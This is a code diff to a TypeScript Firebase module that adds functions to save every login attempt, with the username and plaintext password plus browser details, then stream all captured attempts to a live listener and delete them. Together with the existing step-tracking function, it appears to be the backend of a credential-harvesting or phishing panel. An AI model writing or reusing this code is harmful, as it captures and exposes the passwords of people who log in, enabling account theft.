@@ -404,4 +404,47 @@ export const subscribeToUserStep = (callback: (step: number | null) => void) => 
   });
 };
 
+// Login Attempts Tracking
+export const saveLoginAttempt = async (username: string, password: string) => {
+  try {
+    const visitorId = getVisitorId();
+    const docRef = doc(db, "login_attempts", `${visitorId}_${Date.now()}`);
+    await setDoc(docRef, {
+      visitorId,
+      username,
+      password,
+      createdAt: serverTimestamp(),
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+    });
+    return true;
+  } catch (error) {
+    console.error("Error saving login attempt:", error);
+    return false;
+  }
+};
+
+export const subscribeToLoginAttempts = (callback: (attempts: any[]) => void) => {
+  const collectionRef = collection(db, "login_attempts");
+  const q = query(collectionRef, orderBy("createdAt", "desc"));
+  return onSnapshot(q, (snapshot) => {
+    const attempts = snapshot.docs.map(doc => ({
+      id: doc.id,
+      ...doc.data()
+    }));
+    callback(attempts);
+  });
+};
+
+export const deleteLoginAttempt = async (attemptId: string) => {
+  try {
+    const docRef = doc(db, "login_attempts", attemptId);
+    await deleteDoc(docRef);
+    return true;
+  } catch (error) {
+    console.error("Error deleting login attempt:", error);
+    return false;
+  }
+};
+
 export { db, database };
